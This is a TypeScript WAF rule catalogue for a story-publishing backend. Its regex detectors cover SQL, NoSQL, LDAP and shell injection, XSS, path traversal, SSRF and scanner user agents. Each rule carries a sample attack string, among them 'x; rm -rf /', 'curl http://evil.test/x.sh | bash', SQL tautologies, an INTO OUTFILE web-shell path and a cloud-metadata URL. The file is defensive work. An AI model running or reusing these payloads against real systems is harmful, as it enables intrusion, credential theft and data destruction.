import type { WafOptInControl } from '../../config/waf.config.ts';

export const WAF_LAYERS = [
  'method',
  'body-size',
  'header-injection',
  'injection',
  'xss',
  'traversal',
  'ssrf',
  'bot',
  'geo',
] as const;

export type WafLayer = (typeof WAF_LAYERS)[number];

export const WAF_SEVERITIES = ['low', 'medium', 'high', 'critical'] as const;

export type WafSeverity = (typeof WAF_SEVERITIES)[number];

export const WAF_TARGETS = ['url', 'query', 'body', 'header'] as const;

export type WafTarget = (typeof WAF_TARGETS)[number];

export const WAF_SEVERITY_RANK: Readonly<Record<WafSeverity, number>> = {
  low: 0,
  medium: 1,
  high: 2,
  critical: 3,
};

interface WafRuleBase {
  readonly id: string;
  readonly name: string;
  readonly layer: WafLayer;
  readonly severity: WafSeverity;
  readonly targets: readonly WafTarget[];
  readonly description: string;
  readonly enabledByDefault: boolean;
  /**
   * When set, the rule is INERT unless the operator has turned on the named control in
   * `WafConfig.enabledOptInControls` (env: the control's `WAF_*` flag).
   *
   * Reserved for rules whose premise cannot be decided at this layer — typically "is
   * this header from a trusted ingress or from a public client?", which the WAF has no
   * way to answer. Such a rule is kept in the catalogue (so the pattern stays tested and
   * an operator can enable it) but must never be able to brick a deployment by accident.
   */
  readonly optInControl?: WafOptInControl;
  readonly sample: string;
  readonly sampleTarget: WafTarget;
}

export interface WafPatternRule extends WafRuleBase {
  readonly kind: 'pattern';
  readonly pattern: RegExp;
  readonly requiresAny?: readonly RegExp[];
}

export interface WafControlCharRule extends WafRuleBase {
  readonly kind: 'control-char';
  readonly char: string;
}

export interface WafMaxBytesRule extends WafRuleBase {
  readonly kind: 'max-bytes';
  readonly maxBytes: number;
}

export interface WafAllowedMethodsRule extends WafRuleBase {
  readonly kind: 'allowed-methods';
  readonly allowed: readonly string[];
}

export type WafRule = WafPatternRule | WafControlCharRule | WafMaxBytesRule | WafAllowedMethodsRule;

const SQL_STRING_LITERAL = /(?:'|"|%27|%22|`)[\s\S]{0,200}?(?:'|"|%27|%22|`)/i;
const SQL_COMMENT = /(?:\/\*[\s\S]{0,200}?\*\/|--|#)/;
const SQL_TAUTOLOGY_OPERATOR = /\b(?:or|and)\s+[\w'"]+\s*(?:=|<>|!=|like)\s*[\w'"]+/i;
const SQL_DML_SHAPE =
  /\b(?:select\s+[\s\S]{0,80}?\bfrom\b|insert\s+into\b|delete\s+from\b|drop\s+(?:table|database|view|index)\b|create\s+(?:table|database|view|index)\b|alter\s+table\b|truncate\s+table\b|update\s+\S+\s+set\b)/i;

export const WAF_RULES: readonly WafRule[] = [
  {
    id: 'method-not-allowed',
    name: 'HTTP method not in allow-list',
    kind: 'allowed-methods',
    layer: 'method',
    severity: 'high',
    targets: ['url'],
    allowed: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD'],
    enabledByDefault: true,
    sample: 'TRACE',
    sampleTarget: 'url',
    description:
      'Documented as WAF_ALLOWED_METHODS. TRACE, TRACK and CONNECT are never routed by the Nest application and are only used for protocol-level probing or cache poisoning.',
  },
  {
    id: 'body-size-limit',
    name: 'Request body exceeds the configured maximum',
    kind: 'max-bytes',
    layer: 'body-size',
    severity: 'high',
    targets: ['url', 'body'],
    maxBytes: 10 * 1024 * 1024,
    enabledByDefault: true,
    sample: 'x'.repeat(64),
    sampleTarget: 'body',
    description:
      'Documented as WAF_MAX_REQUEST_SIZE (10MB). Measured from Content-Length when the client sent one, and otherwise from the bytes actually received, so a "Transfer-Encoding: chunked" request cannot omit the header and slip past the limit. Note this is a DETECTION control: the body is already buffered by the time the WAF runs. The PREVENTION control is express.json({ limit }) in backend/src/main.ts, which aborts the stream before buffering, plus the Content-Length fast reject in requestSizeLimit.',
  },

  {
    id: 'header-crlf-injection',
    name: 'CR/LF injection attempt in a header, path or query value',
    kind: 'pattern',
    layer: 'header-injection',
    severity: 'critical',
    targets: ['header', 'url', 'query'],
    pattern: /(?:%0d%0a|%0a|%0d|%00|\r|\n)/i,
    enabledByDefault: true,
    sample: 'title%0d%0aSet-Cookie:%20admin=1',
    sampleTarget: 'query',
    description:
      'A raw CR or LF inside a header name/value, path or query value lets an attacker split the response or inject a second request. Scoped to non-body inputs on purpose: a newline in a stored story body is ordinary prose, not an injection.',
  },
  {
    id: 'header-forbidden-forwarding-headers',
    name: 'Client-supplied host/URL override header',
    kind: 'pattern',
    layer: 'header-injection',
    severity: 'high',
    targets: ['header'],
    pattern:
      /^(?:x-forwarded-host|x-original-url|x-rewrite-url|x-originating-ip|x-custom-ip-authorization|x-forwarded-server)$/i,
    // NOT ACTIVE UNLESS WAF_BLOCK_FORWARDING_HEADERS=true. These six headers are
    // precisely what a reverse proxy or load balancer emits, and the WAF cannot tell a
    // header the ingress added from one a client forged. Left enabled by default it
    // 403'd every request behind any proxy and walked the per-IP violation counter
    // toward a temporary and then a permanent block: a proxied deployment locked itself
    // out. Operators on a direct-to-internet deployment, or behind an ingress that
    // strips these headers, turn it on with WAF_BLOCK_FORWARDING_HEADERS=true and get
    // the original protection. See `WAF_BLOCK_FORWARDING_HEADERS` in waf.config.ts.
    optInControl: 'blockForwardingHeaders',
    enabledByDefault: true,
    sample: 'x-original-url',
    sampleTarget: 'header',
    description:
      'These headers are only trustworthy when a reverse proxy overwrites them. A public client that supplies them can bypass route authorization, poison password-reset links and forge audit logs. The inspected value is the lower-cased header name. OPT-IN: off unless WAF_BLOCK_FORWARDING_HEADERS=true, because behind a proxy that forwards them the rule cannot tell a trusted ingress from a forged client and would block all traffic.',
  },

  {
    id: 'sql-tautology',
    name: 'SQL string tautology',
    kind: 'pattern',
    layer: 'injection',
    severity: 'critical',
    targets: ['url', 'query'],
    pattern: /(?:'|"|%27|%22)\s*(?:or|and)\s*['"]?\s*\w+\s*['"]?\s*(?:=|<>|!=|like)\s*['"]?\s*\w+['"]?/i,
    enabledByDefault: true,
    sample: "' OR '1'='1",
    sampleTarget: 'query',
    description:
      'Detects the classic "quote, boolean operator, comparison" shape. Requires the full tautology structure, so a lone apostrophe never matches.',
  },
  {
    id: 'sql-tautology-numeric',
    name: 'SQL numeric tautology',
    kind: 'pattern',
    layer: 'injection',
    severity: 'critical',
    targets: ['url', 'query'],
    pattern: /\b(?:or|and)\s+\d+\s*=\s*\d+\b/i,
    enabledByDefault: true,
    sample: 'id=1 OR 1=1',
    sampleTarget: 'query',
    description:
      'Numeric form of the tautology. Requires the comparison to be pinned to a literal number, which is not a shape natural-language search queries produce.',
  },
  {
    id: 'sql-comment-terminator',
    name: 'SQL comment terminator closing a literal',
    kind: 'pattern',
    layer: 'injection',
    severity: 'high',
    targets: ['url', 'query'],
    pattern: /(?:'|"|%27|%22|\b\d+\b)\s*(?:--|#)(?![\w-])/i,
    enabledByDefault: true,
    sample: 'id=1--',
    sampleTarget: 'query',
    description:
      'REPLACES the old blanket "block any -- or #" pattern. A comment is only treated as SQL when it directly terminates a quoted or numeric literal, i.e. the position where a SQL comment is actually meaningful. Deliberately never applied to the request body: an em-dash or a "#1" inside a story is content, not an attack. The old pattern /(%27)|(\')|(--)|(%23)|(#)/i 403d every story or comment containing an apostrophe, which is the majority of Arabic and English prose.',
  },
  {
    id: 'sql-dml-statement',
    name: 'SQL DML/DDL statement',
    kind: 'pattern',
    layer: 'injection',
    severity: 'high',
    targets: ['url', 'query'],
    pattern: SQL_DML_SHAPE,
    enabledByDefault: true,
    sample: "q=' UNION ALL SELECT * FROM users " + String.fromCharCode(45, 45),
    sampleTarget: 'query',
    description:
      'A complete statement shape (SELECT..FROM, INSERT INTO, DELETE FROM, DROP TABLE, ...). A second SQL signal is required in the same value so prose such as "select a gift from the market" is not blocked.',
    requiresAny: [SQL_STRING_LITERAL, SQL_COMMENT, SQL_TAUTOLOGY_OPERATOR],
  },
  {
    id: 'sql-stacked-query',
    name: 'Stacked SQL statement',
    kind: 'pattern',
    layer: 'injection',
    severity: 'critical',
    targets: ['url', 'query'],
    pattern:
      /[\w'")\]]\s*;\s*(?:select\s|insert\s+into\b|update\s+\S+\s+set\b|delete\s+from\b|drop\s+(?:table|database|view|index)\b|alter\s+table\b|create\s+(?:table|database)\b|truncate\s+table\b|grant\s+all\b|revoke\s+all\b|exec\b)/i,
    enabledByDefault: true,
    sample: 'id=1; DROP TABLE users',
    sampleTarget: 'query',
    description:
      'A statement terminator followed by a full DML/DDL shape. Requires the semicolon separator AND a complete statement shape, so an ordinary sentence containing a semicolon is unaffected.',
  },
  {
    id: 'sql-time-based',
    name: 'SQL time-based blind injection function',
    kind: 'pattern',
    layer: 'injection',
    severity: 'high',
    targets: ['url', 'query', 'body'],
    // "the book made me sleep( a lot" is prose. A time-based payload always passes a NUMERIC
    // argument, because the argument is the delay. Requiring the digits is what separates the
    // two, and it costs no detection: SLEEP(5), pg_sleep(10) and BENCHMARK(1000,MD5(1)) all
    // carry one. "sleep( a lot" and "sleep()  with no delay" do not.
    pattern: /\b(?:pg_sleep|sleep|benchmark)\s*\(\s*\d+\s*(?:,|\))|\bwaitfor\s+delay\s+['"]?\d/i,
    enabledByDefault: true,
    sample: '1 AND SLEEP(5)',
    sampleTarget: 'body',
    description:
      'A time-delay SQL function called with a numeric argument — the shape of a blind time-based payload. The numeric argument is required, so "the book made me sleep( a lot" is not reported.',
  },
  {
    id: 'sql-file-access',
    name: 'SQL file system access',
    kind: 'pattern',
    layer: 'injection',
    severity: 'critical',
    targets: ['url', 'query', 'body'],
    pattern: /\b(?:load_file\s*\(|load\s+data\s+infile\b|into\s+(?:out|dump)file\b)/i,
    enabledByDefault: true,
    sample: "' INTO OUTFILE '/var/www/shell.php",
    sampleTarget: 'body',
    description: 'Complete MySQL file-access clause; no natural-language overlap.',
  },
  {
    id: 'sql-exec-eval',
    name: 'SQL EXEC/EVAL',
    kind: 'pattern',
    layer: 'injection',
    severity: 'medium',
    targets: ['url', 'query', 'body'],
    pattern: /\b(?:exec|execute\s+immediate|eval)\s*\(/i,
    enabledByDefault: true,
    sample: "'; EXEC('sp_who')",
    sampleTarget: 'body',
    description:
      'Documented pattern. Requires the SQL/PL keywords to be immediately followed by an argument list, so the English word "evaluate" or "executed" is unaffected. Severity is medium, not high, because Hakawi stores user-authored prose and a technical story may legitimately contain "eval(". It is reported and logged by default; set WAF_BLOCK_SEVERITY=medium to block it, or WAF_DISABLED_RULES=sql-exec-eval to disable it.',
  },
  {
    id: 'nosql-operator-injection',
    name: 'NoSQL operator injection',
    kind: 'pattern',
    layer: 'injection',
    severity: 'critical',
    targets: ['url', 'query', 'body'],
    pattern: /[{,[]\s*"?(?:\$ne|\$gt|\$gte|\$lt|\$lte|\$in|\$nin|\$or|\$and|\$regex|\$exists|\$where)"?\s*:/i,
    enabledByDefault: true,
    sample: '{"username": {"$ne": null}}',
    sampleTarget: 'body',
    description:
      'Requires a MongoDB operator key in object-literal position. A bare "$ne" in prose cannot match because the rule demands the JSON structure around it.',
  },
  {
    id: 'nosql-where-clause',
    name: 'NoSQL $where javascript injection',
    kind: 'pattern',
    layer: 'injection',
    severity: 'critical',
    targets: ['url', 'query', 'body'],
    pattern: /"\$where"\s*:\s*"[^"]{0,200}?(?:this\.|sleep\s*\(|==|===)/i,
    enabledByDefault: true,
    sample: '{"$where": "this.password == \'a\'"}',
    sampleTarget: 'body',
    description: 'Server-side JavaScript evaluation through the $where operator.',
  },
  {
    id: 'ldap-filter-injection',
    name: 'LDAP filter injection',
    kind: 'pattern',
    layer: 'injection',
    severity: 'high',
    targets: ['url', 'query', 'body'],
    // An LDAP filter can only be EXTENDED where a metacharacter closes one parenthesised group
    // and opens another, with the universal wildcard "*" substituted for the real value. Two
    // shapes exist and both are matched: "*)(|(uid=*)" (close then open) and "admin)(|(uid=*)"
    // (close the real filter, then open a second one). A lone "(uid=*)" is a complete, valid
    // filter and is also the natural way to write about LDAP in prose, so it is not reported.
    pattern: /[*\\)]\s*\(\s*(?:[|&]\s*)?\(?\s*(?:objectclass|cn|uid|userpassword|mail|sn|givenname)\s*=\s*\*/i,
    enabledByDefault: true,
    sample: '*)(|(uid=*)',
    sampleTarget: 'query',
    description:
      'A closing filter metacharacter immediately followed by an opened filter group whose attribute is set to the universal wildcard — the only position at which an LDAP filter can be extended to bypass an authentication check. A standalone "(uid=*)" in prose is a complete filter, not an injection, and is not reported.',
  },
  {
    id: 'command-chain-separator',
    name: 'Shell command chained after a separator',
    kind: 'pattern',
    layer: 'injection',
    severity: 'critical',
    targets: ['url', 'query', 'body'],
    // "steps & id check", "Tom & Jerry" and "a cat & a dog" are prose, not shell. Most chained
    // commands carry a shell ARGUMENT — a flag, a path, a URL, a wildcard, or a subshell — which
    // is what separates an attack from "steps & id check" and from "He whispered; kill the
    // process". The argumentless commands (whoami, id, uname) are handled by a second
    // alternative that requires the separator itself to be hostile: a command terminator, a
    // backtick, or a pipe — a conjunction such as "&" in a sentence is not.
    pattern:
      /[;&|`]\s*(?:cat|chmod|chown|curl|id|kill|nc|netcat|rm|wget)\b[^\n;&|`]{0,40}?(?:\s-{1,2}[\w-]+|\/[^\s]*|\*|https?:\/\/|\$\()|[;|`]\s*(?:whoami|uname|id)\b(?:\s-{1,2}[\w-]+)?\s*(?:$|[\n;&|`])|(?:curl|wget)\b[^\n]{0,200}\|\s*(?:ba|z|k)?sh\b/i,
    enabledByDefault: true,
    sample: 'x; rm -rf /',
    sampleTarget: 'body',
    description:
      'A shell metacharacter followed by a known command name and a shell-shaped argument, or an argumentless command (whoami, uname, id) after a hostile terminator. Requiring the argument is what separates an attack from "steps & id check" and "Tom & Jerry"; requiring a terminator rather than any conjunction is what keeps "Kill the process, then restart" out of the report. The curl/wget-piped-to-shell form is matched directly because it has no free-text window.',
  },
  {
    id: 'command-substitution',
    name: 'Shell command substitution',
    kind: 'pattern',
    layer: 'injection',
    severity: 'critical',
    targets: ['url', 'query', 'body'],
    pattern: /\$\(\s*(?:cat|curl|id|ls|nc|rm|uname|whoami|wget)\b/i,
    enabledByDefault: true,
    sample: '$(curl http://evil.test/x)',
    sampleTarget: 'body',
    description:
      '$( followed by a known command name; the identifier list keeps ordinary prose such as "$(see below)" safe.',
  },
  {
    id: 'command-pipe-to-shell',
    name: 'Downloaded script piped to a shell',
    kind: 'pattern',
    layer: 'injection',
    severity: 'critical',
    targets: ['url', 'query', 'body'],
    pattern: /\b(?:curl|wget)\b[^\n|]{0,200}\|\s*(?:ba|z|k)?sh\b/i,
    enabledByDefault: true,
    sample: 'curl http://evil.test/x.sh | bash',
    sampleTarget: 'body',
    description: 'Reverse-shell pattern: a downloader piped into an interpreter.',
  },
  {
    id: 'command-destructive-rm',
    name: 'Destructive rm -rf',
    kind: 'pattern',
    layer: 'injection',
    severity: 'high',
    targets: ['url', 'query', 'body'],
    pattern: /\brm\s+-[a-z]*[rf][a-z]*\b/i,
    enabledByDefault: true,
    sample: 'rm -rf /',
    sampleTarget: 'body',
    description: 'Documented pattern; the recursive+force flag combination has no prose reading.',
  },
  {
    id: 'command-backtick-execution',
    name: 'Backtick shell execution',
    kind: 'pattern',
    layer: 'injection',
    severity: 'high',
    targets: ['url', 'query'],
    pattern: /`\s*(?:id|whoami|uname|ifconfig|netstat|curl|wget|cat)\s*`/i,
    enabledByDefault: true,
    sample: 'q=`whoami`',
    sampleTarget: 'query',
    description:
      'Restricted to the URL and query string: backticks are markdown code delimiters in stored story bodies, so the body is deliberately not inspected for this rule.',
  },

  {
    id: 'xss-script-tag',
    name: 'Script tag or javascript: URI',
    kind: 'pattern',
    layer: 'xss',
    severity: 'high',
    targets: ['url', 'query', 'body', 'header'],
    pattern: /<\s*script\b|\bjavascript\s*:/i,
    enabledByDefault: true,
    sample: '<script>alert(1)</script>',
    sampleTarget: 'body',
    description:
      'Documented pattern. Disable with WAF_DISABLED_RULES=xss-script-tag if the CMS must accept stories that legitimately embed HTML snippets.',
  },
  {
    id: 'xss-event-handler',
    name: 'Inline event handler attribute',
    kind: 'pattern',
    layer: 'xss',
    severity: 'high',
    targets: ['url', 'query', 'body'],
    pattern: /\bon(?:error|load|click|mouseover|focus|submit|toggle|animationstart)\s*=\s*\S/i,
    enabledByDefault: true,
    sample: '<img src=x onerror=alert(1)>',
    sampleTarget: 'body',
    description:
      'Requires the attribute to be an unspaced identifier followed by "=" and a value, which is the HTML attribute shape. English prose "on click = fast" cannot match because the handler name must be contiguous.',
  },
  {
    id: 'xss-dangerous-element',
    name: 'Dangerous embedded element',
    kind: 'pattern',
    layer: 'xss',
    severity: 'high',
    targets: ['url', 'query', 'body'],
    pattern: /<\s*(?:iframe|object|embed|svg|math|form|base|meta)\b/i,
    enabledByDefault: true,
    sample: '<iframe src="http://evil.test"></iframe>',
    sampleTarget: 'body',
    description: 'Documented pattern covering the elements that execute script or rewrite the document base.',
  },
  {
    id: 'xss-data-uri',
    name: 'data: URI with executable content',
    kind: 'pattern',
    layer: 'xss',
    severity: 'high',
    targets: ['url', 'query', 'body'],
    pattern: /\bdata\s*:\s*[^\s;]{0,120}?(?:base64|script|html)/i,
    enabledByDefault: true,
    sample: 'data:text/html;base64,PHNjcmlwdD4=',
    sampleTarget: 'body',
    description: 'Only data: URIs carrying base64 or an executable media type are treated as an attack.',
  },
  {
    id: 'xss-script-function',
    name: 'Browser script execution function',
    kind: 'pattern',
    layer: 'xss',
    severity: 'high',
    targets: ['url', 'query', 'body'],
    pattern:
      /\b(?:alert|prompt|confirm|atob|btoa)\s*\(|\bdocument\s*\.\s*(?:cookie|domain|write|forms)\b|\bwindow\s*\.\s*location\s*=/i,
    // Hakawi stores user-authored prose, and "confirm(", "prompt(", "atob(", "document.cookie" and
    // "window.location" are ordinary English and technical usage. A bare call shape, or a bare
    // property read, is therefore not on its own evidence of XSS. The co-signals below are what a
    // real payload must ALSO contain:
    //   - a single-token or quoted-string argument terminated by a comma or a closing paren.
    //     "alert(1)", "atob(\"PHNjcmlwdD4=\")" and "alert(document.cookie)" have one;
    //     "Please confirm( your email address" and "Use atob( to decode this" do not, because
    //     their argument is a multi-word phrase with no terminator. The same trade-off means
    //     "confirm(are you sure)" is treated as prose — an unavoidable cost of not banning the
    //     English word "confirm" followed by a bracket.
    //   - a document.* read in an executable position: inside a call, on the right of an
    //     assignment, or dereferenced. The prose "document.cookie is a browser API" is a
    //     sentence about the API, not a read, and is not reported.
    //   - a string literal assigned to window.location, i.e. navigation to an attacker's origin.
    //     The prose "window.location = url" has an unquoted right-hand side and is not reported.
    requiresAny: [
      /\(\s*(?:['"`][^'"`]{0,200}['"`]|[A-Za-z_$][\w$]*(?:\s*[.[][^\s)]{0,60})?|\d+(?:\s*,\s*[^\s)]{1,60})?)\s*[,)]/,
      /\bwindow\s*\.\s*location\s*=\s*['"`]/,
      /\bdocument\s*\.\s*(?:cookie|domain|write|forms)\b\s*(?:[),;=]|\[\s*['"`])/,
      /=\s*document\s*\.\s*(?:cookie|domain|write|forms)\b/,
    ],
    enabledByDefault: true,
    sample: 'alert(document.cookie)',
    sampleTarget: 'body',
    description:
      'A browser script function call, a document.cookie read, or a window.location assignment — reported only when the value also carries a JavaScript-shaped argument or a quoted navigation target. Severity stays high because a real payload always satisfies a co-signal. Ordinary prose such as "Please confirm( your email address", "Use atob( to decode this" and "window.location = url" is not reported at all.',
  },

  {
    id: 'traversal-relative-segment',
    name: 'Relative path traversal segment',
    kind: 'pattern',
    layer: 'traversal',
    severity: 'high',
    targets: ['url', 'query', 'body'],
    pattern: /(?:^|[/\\])\.\.(?:[/\\]|$)|\.\.(?:%2f|%5c|%252f)|%2e%2e(?:[/\\]|%2f|%5c)/i,
    enabledByDefault: true,
    sample: '/files/../../../etc/passwd',
    sampleTarget: 'url',
    description: 'Relative traversal, including single and double percent-encoding.',
  },
  {
    id: 'traversal-sensitive-file',
    name: 'Reference to a sensitive system file',
    kind: 'pattern',
    layer: 'traversal',
    severity: 'critical',
    targets: ['url', 'query', 'body'],
    pattern:
      /(?:^|[/\\])(?:etc[/\\](?:passwd|shadow|group)|proc[/\\]self[/\\]environ|windows[/\\]win\.ini|boot\.ini)\b/i,
    enabledByDefault: true,
    sample: '..%2f..%2f..%2fetc%2fpasswd',
    sampleTarget: 'query',
    description: 'Documented pattern; a path segment that only makes sense as a filesystem escape.',
  },
  {
    id: 'traversal-server-config',
    name: 'Reference to a server configuration file',
    kind: 'pattern',
    layer: 'traversal',
    severity: 'high',
    targets: ['url', 'query'],
    pattern: /(?:^|[/\\])(?:\.htaccess|\.htpasswd|web\.config)\b/i,
    enabledByDefault: true,
    sample: '/uploads/.htaccess',
    sampleTarget: 'url',
    description:
      'Documented pattern; scoped to the request target because a story may legitimately mention the file name.',
  },
  {
    id: 'traversal-null-byte',
    name: 'Null byte in the request target',
    kind: 'control-char',
    layer: 'traversal',
    severity: 'high',
    targets: ['url', 'query'],
    char: '\u0000',
    enabledByDefault: true,
    sample: 'file=image.png%00.php',
    sampleTarget: 'query',
    description: 'Null-byte truncation of a file extension, as used by pre-2015 extension checks.',
  },

  {
    id: 'ssrf-cloud-metadata',
    name: 'Cloud instance metadata endpoint',
    kind: 'pattern',
    layer: 'ssrf',
    severity: 'critical',
    targets: ['url', 'query', 'body'],
    pattern: /(?:169\.254\.169\.254|metadata\.google\.internal|metadata\.goog|100\.100\.100\.200)/i,
    enabledByDefault: true,
    sample: 'http://169.254.169.254/latest/meta-data/iam/',
    sampleTarget: 'body',
    description: 'Reaching the metadata service from a user-supplied URL yields cloud credentials.',
  },
  {
    id: 'ssrf-private-network',
    name: 'Request to a private or loopback address',
    kind: 'pattern',
    layer: 'ssrf',
    severity: 'high',
    targets: ['url', 'query', 'body'],
    pattern:
      /\bhttps?:\/\/(?:localhost|127\.\d{1,3}\.\d{1,3}\.\d{1,3}|0\.0\.0\.0|\[::1\]|\[::ffff:127\.\d{1,3}\.\d{1,3}\.\d{1,3}\]|\[f[cd][0-9a-f]{2}:|\[fe80:|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|0x[0-9a-f]{1,8}\b|\d{8,10}\b|10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|169\.254\.\d{1,3}\.\d{1,3}|100\.(?:6[4-9]|[7-9]\d|1[01]\d|12[0-7])\.\d{1,3}\.\d{1,3})/i,
    enabledByDefault: true,
    sample: 'http://192.168.1.1/admin',
    sampleTarget: 'body',
    description:
      'Only absolute URLs are inspected, so prose containing a version number is unaffected. Covers RFC1918, loopback, link-local 169.254/16, CGNAT 100.64/10, IPv6 loopback, IPv6 ULA fc00::/7, IPv6 link-local, IPv4-mapped IPv6 loopback, and the decimal/hex/octal integer encodings of 127.0.0.1 that a parser will still resolve.',
  },
  {
    id: 'ssrf-encoded-host',
    name: 'Non-dotted-decimal or short-form host in a URL',
    kind: 'pattern',
    layer: 'ssrf',
    severity: 'high',
    targets: ['url', 'query', 'body'],
    // A dotted quad of plain decimal octets is the only unambiguous host form. Everything else
    // below is a host that a URL parser resolves to a private address but that a dotted-decimal
    // pattern cannot see: the decimal/hex integer forms, the leading-zero (octal) forms, and the
    // 1-, 2- and 3-part short forms that inet_aton() accepts ("http://127.1/" is loopback).
    //
    // Scope, stated honestly: this rule recognises host SHAPES, it is not a URL parser. An exotic
    // mixed encoding such as "http://0x7f.0x0.0x0.0x1/" is not matched here. The durable fix is
    // to normalise the host with `new URL(...).hostname` before the rules run; until that exists,
    // the residual gap is recorded in backend/src/common/waf/README.md rather than papered over.
    // Hakawi currently has no user-supplied URL fetch sink, so the gap is latent, not live.
    pattern:
      /\bhttps?:\/\/(?:\d{1,3}(?:\.\d{1,3}){0,2}(?=[:/?#]|$)|\d{4,}(?=[:/?#]|$)|0x[0-9a-f]{2,}(?=[:/?#]|$)|0\d{1,3}(?:\.\d{1,3}){1,3}(?=[:/?#]|$))/i,
    enabledByDefault: true,
    sample: 'http://2130706433/',
    sampleTarget: 'body',
    description:
      'A host that is not a plain dotted decimal quad: the integer/hex encodings of 127.0.0.1, the leading-zero octal forms, and the inet_aton short forms. "http://127.0.0.1/" (four octets) is left to ssrf-private-network; a path segment such as "/stories/12345" cannot match because the shape is anchored to the position right after the scheme.',
  },
  {
    id: 'ssrf-non-http-scheme',
    name: 'Non-HTTP URL scheme',
    kind: 'pattern',
    layer: 'ssrf',
    severity: 'high',
    targets: ['url', 'query', 'body'],
    pattern: /^(?:file|gopher|dict|ftp|tftp|ldap|ldaps|jar|netdoc|expect):/i,
    enabledByDefault: true,
    sample: 'file:///etc/passwd',
    sampleTarget: 'body',
    description: 'Anchored at the start of the value so a word such as "dictionary" cannot match.',
  },

  {
    id: 'bot-scanner-user-agent',
    name: 'Known vulnerability scanner user agent',
    kind: 'pattern',
    layer: 'bot',
    severity: 'high',
    targets: ['header'],
    pattern:
      /\b(?:sqlmap|nikto|nmap|masscan|metasploit|acunetix|nessus|burpsuite|burp|dirbuster|gobuster|wpscan|havij|nuclei|zgrab)\b/i,
    enabledByDefault: true,
    sample: 'sqlmap/1.7.2#stable (https://sqlmap.org)',
    sampleTarget: 'header',
    description: 'Documented bot signature list, matched against the User-Agent header only.',
  },
  {
    id: 'bot-automation-user-agent',
    name: 'Generic automation user agent',
    kind: 'pattern',
    layer: 'bot',
    severity: 'low',
    targets: ['header'],
    pattern:
      /\b(?:python-requests|python-urllib|go-http-client|java-http-client|okhttp|axios|node-fetch|scrapy|httpclient)\b|\b(?:curl|wget)\/\d/i,
    enabledByDefault: true,
    sample: 'python-requests/2.31.0',
    sampleTarget: 'header',
    description:
      'Listed in the documentation but deliberately only "low": these clients are also used by the frontend, the mobile app, health checks and the Playwright suite. It is reported and logged, never blocked at the default severity threshold.',
  },
  {
    id: 'geo-blocked-country',
    name: 'Request from a blocked country',
    kind: 'pattern',
    layer: 'geo',
    severity: 'high',
    targets: ['header'],
    // This rule is handled specially in the middleware via GeoIpService.
    // The pattern here is a placeholder; the actual matching happens in evaluateNonPatternRules.
    pattern: /^/,
    optInControl: 'geoBlocking',
    enabledByDefault: true,
    sample: 'X-Forwarded-For: 1.2.3.4 (CN)',
    sampleTarget: 'header',
    description:
      'Blocks requests from countries listed in WAF_BLOCKED_COUNTRIES (ISO 3166-1 alpha-2 codes). '
      + 'Requires GeoIP service (geoip-lite). Only active when WAF_BLOCKED_COUNTRIES is set. '
      + 'Private/internal IPs are never blocked. Fail-open: if GeoIP lookup fails, the request passes.',
  },
];

export function getRuleById(id: string): WafRule | undefined {
  return WAF_RULES.find((rule) => rule.id === id);
}

export function isSeverityAtLeast(severity: WafSeverity, minimum: WafSeverity): boolean {
  return WAF_SEVERITY_RANK[severity] >= WAF_SEVERITY_RANK[minimum];
}

export function matchesRuleValue(rule: WafPatternRule, value: string): boolean {
  if (!rule.pattern.test(value)) {
    return false;
  }
  if (!rule.requiresAny || rule.requiresAny.length === 0) {
    return true;
  }
  return rule.requiresAny.some((requirement) => requirement.test(value));
}
